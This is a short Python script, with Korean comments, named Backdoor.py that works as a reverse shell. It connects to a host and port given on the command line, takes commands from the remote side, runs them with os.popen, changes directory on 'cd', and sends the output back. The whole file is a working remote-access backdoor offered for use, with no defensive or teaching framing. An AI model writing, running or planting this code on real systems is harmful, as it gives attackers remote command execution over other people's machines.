import os
import socket
import sys
import subprocess
def usage(): ## 도움말
    print('''
    Backdoor.py <host> <port>
    ''')
    exit()

if len(sys.argv) <3 :
    usage()
with socket.socket() as s:
    addr =(sys.argv[1], int(sys.argv[2]))
    s.connect(addr)
    s.send('''
####################
#   Backdoor.py    #
####################
>>'''.encode())

    while True:
        data =s.recv(1024).decode().lower()

        if "q" == data:
            print("프로그램을 종료합니다...")
            exit()

        else:
            if data.startswith("cd"):
                ## change diractory
                os.chdir(data[3:].replace('\n',''))
            else:
                result = os.popen(data).read()
            result = result+"\n>>"
            s.send(result.encode())
